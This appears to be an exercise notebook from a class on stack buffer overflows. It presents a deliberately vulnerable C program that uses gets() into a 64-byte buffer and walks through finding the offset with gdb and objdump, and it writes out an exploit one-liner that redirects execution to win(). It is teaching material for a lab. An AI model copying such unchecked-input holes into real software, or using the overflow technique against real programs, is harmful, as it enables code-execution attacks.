# %%
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void win()
{
 printf("PWNED! - code flow successfully changed\n");
}

int main(int argc, char **argv)
{
 char buffer[64];

 gets(buffer);
}

# %% [markdown]
# Very simple!
#
# it defines the win function then defines the main function which sets a buffer of 64 chars and stores our input in it.
#
# But wait a second where is the variable that we’re gonna overwrite? in the previous challenges we had a variable that is being used by a function to change the code flow, now what will we overwrite?
#
# The answer is the EIP which is the instruction pointer. And the instruction pointer is a memory address that holds the address of the next instruction in the program during execution. So if we overwrite that address the program will execute whatever that address refers to. let’s try to exceed the buffer.
# ```
# python -c "print 'A' * 64"
# ```
# The program didn’t even crash… why?
#
# Because the return address is not directly after the buffer like in the previous challenges , Let’s try 100 chars...
# ```
# python -c "print 'A' * 100"
# ```
# Now, the program crashed, let’s find where does it exactly crash like we did in the previous challenge.
#
# Then we will pass it to the program in `gdb` to work out the offset just like before.
#
# For me it crashes at 0x63413563 and when I lcate the paterns offset I get an offset of 76.
#
# Next step is to find the address of win()
#
# ```
# objdump -d
# ```
#
# and for me the address is `0x080483f4` which allows me to build my exploit to look like:
# ```
# python -c "print 'A' * 76 + '\xf4\x83\x04\x08'" | ./example6
# PWNED! - code flow successfully changed
# ```
#
# And we successfully changed the code flow!
#
# This exercise was slightly different as we needed to flood more than the buffer to get control of the programs execution flow. There was not a function pointer to take us to where we needed so we needed to flood further into the stack to get control.
#
# ### Tasks
# - Your code may already be able to flood this exercise without difficulty if not update it so it can
# - Update the C code to reflect the buffer in other scenarios (Environment Variable or command argument) and make sure your scripts work against them
# - See if you can make your script and `gdb` hack ALL the examples in a single directory
# - Make some pretty output for the class to watch on for the above

# %% [markdown]
# #The fin4l BREAK 0f th1ng5!eleven11?1
#
# There is not much left to teach you on this subject. Let's see if you can do this one all by yourself.
#
# Below is some buggy code that I don't want you to read to much into.
